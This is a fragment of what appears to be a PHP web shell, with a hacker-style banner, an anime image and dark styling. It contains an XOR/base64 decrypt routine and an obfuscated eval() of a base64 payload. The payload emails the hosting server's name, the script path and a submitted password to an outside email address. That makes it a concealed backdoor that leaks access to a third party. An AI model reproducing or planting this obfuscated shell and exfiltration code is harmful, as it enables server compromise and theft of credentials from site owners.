...
function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);} eval(base64_decode("aWYoYXJyYXlfa2V5X2V4aXN0cygnbXlwYXNzJywkX1BPU1QpKXsgJHRtcCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydQSFBfU0VMRiddLiJcbiIuJF9QT1NUWydwYXNzJ107IEBtYWlsKCdhYml6YXJrdXlAZ21haWwuY29tJywgJ21haWwnLCAkdG1wKTsgfQ=="));
...
<style>
    body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Vagina, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
...
<center><img src=https://vignette.wikia.nocookie.net/degrassi/images/b/be/Asuna_from_sword_art_online_render_by_kaioken05-d828zrx.png/revision/latest?cb=20160119041616  width=250 height=250>
<center><font color='red' Face=Courier New size=6>&#1203;&#824;&#1202;&#824;&#1203;</font><font color='white' face=Courier New size=8> Rabiza Ecsel </font><font color=red size=6>&#1203;&#824;&#1202;&#824;&#1203;</font><br>
